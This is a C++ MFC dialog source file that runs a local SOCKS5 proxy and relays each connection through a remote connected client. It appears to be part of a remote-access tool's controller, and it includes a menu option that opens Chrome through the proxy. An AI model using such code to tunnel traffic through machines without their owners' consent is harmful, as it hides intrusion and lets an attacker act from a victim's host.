// ProxyMapDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "ProxyMapDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CProxyMapDlg dialog

CProxyMapDlg* g_pProxyMap;
#define IDM_PROXY_CHROME      8000
CProxyMapDlg::CProxyMapDlg(CWnd* pParent, ISocketBase* pIOCPServer, ClientContext* pContext)
	: CDialog(CProxyMapDlg::IDD, pParent)
{
	
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_iocpLocal = NULL;
	g_pProxyMap = this;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_Proxifier));
	m_bOnClose = false;
	isclose = false;
}


void CProxyMapDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CProxyMapDlg)
	DDX_Control(pDX, IDC_EDIT, m_edit);
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_EDIT_OTHER, m_edit_other);
}
#define WM_NOTIFYPROC (WM_USER+109)

BEGIN_MESSAGE_MAP(CProxyMapDlg, CDialog)
	//{{AFX_MSG_MAP(CProxyMapDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////

BOOL CProxyMapDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	// TODO: Add extra initialization here
	m_iocpLocal = new CProxyConnectServer;

	if (m_iocpLocal == NULL)
	{
		AfxMessageBox(_T("CIOCPLOCAL == NULL"));
		return FALSE;
	}

	m_edit.SetLimitText(MAXDWORD); 
	m_edit_other.SetLimitText(MAXDWORD); 
	CString		str;

	// 开启IPCP服务器
	nPort = 1500;
	for (int i = 0; i < 20; i++)
	{
		if (m_iocpLocal->Initialize(NotifyProc, 100000, nPort + i))
		{
			break;
		}
		else if (i > 10)
		{
			if (m_iocpLocal->Initialize(NotifyProc, 100000, 0))
			{
				i = 20;
			}
			else
			{
				str.Format(_T("\\\\代理服务器 端口绑定失败  默认端口 \r\n"));
				SetWindowText(str);
				return FALSE;
			}
		}
	}
	TCHAR lisip[256] = _T("");
	int iplen = sizeof(lisip);
	m_iocpLocal->m_TcpServer->GetListenAddress(lisip, iplen, nPort);
	str.Format(_T("代理服务器 \\\\ %s 端口: %d \r\n"), m_pContext->szAddress, nPort);
	SetWindowText(str);
	str.Format(_T("socks代理软件请设置服务器为:127.0.0.1, 端口为:%d \r\n"), nPort);
	AddLog(str.GetBuffer(0));

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		pSysMenu->AppendMenu(MF_SEPARATOR);
		pSysMenu->AppendMenu(MF_STRING, IDM_PROXY_CHROME, _T("代理方式打开chrome(必须关闭所有chrome进程，如崩溃不要再使用)(&P)"));
	}

	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CProxyMapDlg::OnCancel()
{
	// TODO: Add your message handler code here and/or call default
	isclose = true;
	if (m_bOnClose) return;
	m_bOnClose = TRUE;
	m_iocpServer->Disconnect(m_pContext);
	DestroyIcon(m_hIcon);
	m_iocpLocal->Shutdown();
	SAFE_DELETE(m_iocpLocal);
	Sleep(50);
	if (IsWindow(m_hWnd))
		DestroyWindow();
}

void CALLBACK CProxyMapDlg::NotifyProc(ClientContext* pContext, UINT nCode)
{
	if (g_pProxyMap->isclose) return;


	DWORD index = pContext->dwID;
	TCHAR szMsg[200] = { 0 };
	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			wsprintf(szMsg, _T("%d 新连接\r\n"), index);
			break;
		case NC_CLIENT_DISCONNECT:
			if (pContext->m_bProxyConnected)
			{
				BYTE lpData[5] = "";
				lpData[0] = COMMAND_PROXY_CLOSE;
				memcpy(lpData + 1, &index, sizeof(DWORD));
				g_pProxyMap->m_iocpServer->Send(g_pProxyMap->m_pContext, lpData, 5);
			}
			wsprintf(szMsg, _T("%d 本地连接断开\r\n"), index);
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			if (pContext->m_bProxyConnected == 2)
			{
				g_pProxyMap->m_iocpServer->Send(g_pProxyMap->m_pContext, pContext->m_CompressionBuffer.GetBuffer(),
					pContext->m_CompressionBuffer.GetBufferLen());
				wsprintf(szMsg, _T("%d <==发 %d bytes\r\n"), index, pContext->m_CompressionBuffer.GetBufferLen() - 5);
			}
			else if (pContext->m_bProxyConnected == 0)
			{
				char msg_auth_ok[] = { 0X05, 0X00 }; // VERSION SOCKS, AUTH MODE, OK		
				LPBYTE lpData = pContext->m_CompressionBuffer.GetBuffer(5);
				pContext->m_bProxyConnected = 1;
				g_pProxyMap->m_iocpLocal->Send(pContext, (LPBYTE)msg_auth_ok, sizeof(msg_auth_ok));
				wsprintf(szMsg, _T("%d 返回标示 %d %d %d\r\n"), index, lpData[0], lpData[1], lpData[2]);
			}
			else if (pContext->m_bProxyConnected == 1)
			{
				LPBYTE lpData = pContext->m_CompressionBuffer.GetBuffer(5);
				BYTE buf[11] = "";
				if (lpData[0] == 5 && lpData[1] == 1 && (pContext->m_CompressionBuffer.GetBufferLen() > 10))
				{
					if (lpData[3] == 1)// ipv4
					{
						buf[0] = COMMAND_PROXY_CONNECT; // 1个字节 ip v4 连接 
						memcpy(buf + 1, &index, 4);		 // 四个字节 套接字的编号
						memcpy(buf + 5, lpData + 4, 6);	 // 4字节ip 2字节端口
						g_pProxyMap->m_iocpServer->Send(g_pProxyMap->m_pContext, buf, sizeof(buf));
						in_addr inaddr = {};
						inaddr.s_addr = *(DWORD*)(buf + 5);
						char szmsg1[MAX_PATH];
						wsprintfA(szmsg1, "%d Ipv4 连接 %s:%d...\r\n", index, inet_ntoa(inaddr), ntohs(*(USHORT*)(buf + 9)));
						MultiByteToWideChar(CP_ACP, 0, szmsg1, -1, szMsg, sizeof(szMsg) / sizeof(szMsg[0]));
					}
					else if (lpData[3] == 3) // 域名
					{

						Socks5Info* Socks5Request = (Socks5Info*)lpData;
						BYTE* HostName = new BYTE[Socks5Request->IP_LEN + 8];
						ZeroMemory(HostName, Socks5Request->IP_LEN + 8);
						HostName[0] = COMMAND_PROXY_CONNECT_HOSTNAME;
						memcpy(HostName + 7, &Socks5Request->szIP, Socks5Request->IP_LEN);
						memcpy(HostName + 1, &index, 4);
						memcpy(HostName + 5, &Socks5Request->szIP + Socks5Request->IP_LEN, 2);
						g_pProxyMap->m_iocpServer->Send(g_pProxyMap->m_pContext, HostName, Socks5Request->IP_LEN + 8);
						SAFE_DELETE_AR(HostName);
						wsprintf(szMsg, _T("域名 连接 %d \r\n"), index);
					}
					else if (lpData[3] == 4)   //ipv6
					{
						char msg_ipv6_nok[] = { 0X05, 0X08, 0X00, 0X01, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00 }; // IPv6 not compt
						wsprintf(szMsg, _T("%d ipv6连接 不支持..."), index);
						g_pProxyMap->m_iocpLocal->Send(pContext, (LPBYTE)msg_ipv6_nok, sizeof(msg_ipv6_nok));
						g_pProxyMap->m_iocpLocal->Disconnect(pContext->m_Socket);
						break;
					}
				}
				else
				{
					buf[0] = 5;
					buf[1] = 7;
					buf[2] = 0;
					buf[3] = lpData[3];
					g_pProxyMap->m_iocpLocal->Send(pContext, buf, sizeof(buf));
					g_pProxyMap->m_iocpLocal->Disconnect(pContext->m_Socket);
					wsprintf(szMsg, _T("%d 不符要求,断开 %d %d %d\r\n"), index, lpData[0], lpData[1], lpData[3]);
				}
			}
			break;
		}
	}
	catch (...) {}
	if (szMsg[0])
		g_pProxyMap->AddLog_other(szMsg);
	return;
}

void CProxyMapDlg::OnReceive()
{
	if (m_pContext == NULL)
		return;
	if (m_bOnClose) 	return;
	CString str;
	str.Format(_T("代理服务器 \\\\ %s 端口: %d   [收包:%d 收:%d KB] [发包:%d 发:%d KB]"), m_pContext->szAddress, nPort, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
	SetWindowText(str);
}

void CProxyMapDlg::OnReceiveComplete()
{
	if (m_iocpLocal == NULL)
		return;

	if (m_iocpLocal->m_TcpServer->HasStarted() == FALSE || isclose)
		return;


	LPBYTE buf = m_pContext->m_DeCompressionBuffer.GetBuffer(0);
	DWORD index = *(DWORD*)&buf[1];
	TCHAR szMsg[200];
	switch (buf[0])
	{
	case TOKEN_PROXY_CONNECT_RESULT:
	{
		char msg_request_co_ok[] = { 0X05, 0X00, 0X00, 0X01, 0X00, 0X00, 0X00, 0X00, 0X00, 0X00 }; // Request connect OK

		BYTE sendbuf[10] = "";
		sendbuf[0] = 5;
		sendbuf[1] = (buf[9] || buf[10]) ? 0 : 5;
		sendbuf[2] = 0;
		sendbuf[3] = 1;
		memcpy(&sendbuf[4], &buf[5], 6);

		ClientContext* pContext_proxy = NULL;
		if (m_iocpLocal->m_TcpServer->GetConnectionExtra((CONNID)index, (PVOID*)&pContext_proxy) && pContext_proxy != nullptr)
		{
			if (sendbuf[1] == 0)
			{
				pContext_proxy->m_bProxyConnected = 2;
				wsprintf(szMsg, _T("%d 连接成功\r\n"), index);
			}
			else
				wsprintf(szMsg, _T("%d 连接失败\r\n"), index);
			m_iocpLocal->Send(pContext_proxy, sendbuf, sizeof(sendbuf));
			AddLog(szMsg);
		}
	}
	break;
	case TOKEN_PROXY_BIND_RESULT:
		break;
	case TOKEN_PROXY_CLOSE:
	{
		wsprintf(szMsg, _T("%d TOKEN_PROXY_CLOSE\r\n"), index);

		m_iocpLocal->Disconnect(index);
		AddLog(szMsg);
	}
	break;
	case TOKEN_PROXY_DATA:
	{
		ClientContext* pContext_proxy = NULL;
		BOOL ok = FALSE;
		if (m_iocpLocal->m_TcpServer->GetConnectionExtra((CONNID)index, (PVOID*)&pContext_proxy) && pContext_proxy != nullptr)
		{
			ok = m_iocpLocal->Send(pContext_proxy, &buf[5], m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5);
			if (ok == FALSE)
			{
				wsprintf(szMsg, _T("%d TOKEN_PROXY_CLOSE\r\n"), index);
				m_iocpLocal->Disconnect(index);
				AddLog(szMsg);
				return;
			}
			wsprintf(szMsg, _T("%d ==>收 %d bytes\r\n"), index, m_pContext->m_DeCompressionBuffer.GetBufferLen() - 5);
			AddLog(szMsg);
		
		}
	}
	break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CProxyMapDlg::AddLog(TCHAR* lpText)
{
	if (isclose == TRUE) return;
	m_edit.SetSel(-1, -1);
	m_edit.ReplaceSel(lpText);
}

void CProxyMapDlg::AddLog_other(TCHAR* lpText)
{
	if (isclose == TRUE) return;
	m_edit_other.SetSel(-1, -1);
	m_edit_other.ReplaceSel(lpText);
}

void CProxyMapDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible())
		return;

	RECT	rectClient;
	RECT	rectEdit = {};
	GetClientRect(&rectClient);
	rectEdit.left = 0;
	rectEdit.top = 0;
	rectEdit.right = rectClient.right;
	rectEdit.bottom = rectClient.bottom;
	m_edit.MoveWindow(&rectEdit);
}

void CProxyMapDlg::PostNcDestroy()
{

	if (!m_bOnClose)
		OnCancel();
	CDialog::PostNcDestroy();
	delete this;
}


void CProxyMapDlg::OnSysCommand(UINT nID, LPARAM lParam)
{

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	switch (nID)
	{
	case IDM_PROXY_CHROME:
	{
		CString strCommand;
		strCommand.Format(_T(" /c start chrome.exe --show-app-list  --proxy-server=\"SOCKS5://127.0.0.1:%d\""), nPort);
		ShellExecute(NULL, _T("open"), _T("cmd.exe"), strCommand, NULL, SW_SHOW);

	}
	break;
	}
	CDialog::OnSysCommand(nID, lParam);
}
